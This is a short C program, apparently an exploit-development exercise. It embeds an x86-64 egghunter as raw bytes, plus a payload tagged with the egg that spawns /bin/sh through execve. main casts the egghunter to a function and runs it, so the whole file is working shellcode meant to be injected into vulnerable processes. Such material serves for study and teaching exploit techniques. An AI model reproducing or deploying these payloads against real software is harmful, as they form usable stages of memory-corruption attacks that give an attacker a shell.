#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] = \
"\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x48\x31\xc0\x50\x6a\x15\x58\x5e\x0f\x05\x3c\xf2\x74\xe6\xb8\x90\x50\x90\x50\x48\x89\xd7\xaf\x75\xe0\xaf\x75\xdd\xff\xe7";

unsigned char shellcode[] = EGG EGG \
"\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
{
    printf("Shellcode Length:  %ld\n", strlen(egghunter));
    printf("Shellcode located at:  %p\n", shellcode);

    int (*ret)() = (int(*)())egghunter;

    ret();

}
